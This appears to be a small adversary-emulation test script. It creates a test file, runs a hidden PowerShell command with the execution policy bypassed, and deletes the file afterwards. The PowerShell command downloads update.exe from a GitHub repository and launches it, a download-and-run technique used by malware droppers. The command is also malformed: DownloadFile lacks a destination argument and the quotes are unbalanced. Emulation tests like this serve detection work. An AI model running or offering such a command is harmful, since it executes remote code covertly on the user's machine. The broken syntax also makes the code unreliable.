echo "Atomic Test File" > test.txt

powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/markersmake/RandomScripts/raw/master/update.exe'); Start-Process(update.exe)"

del test.txt
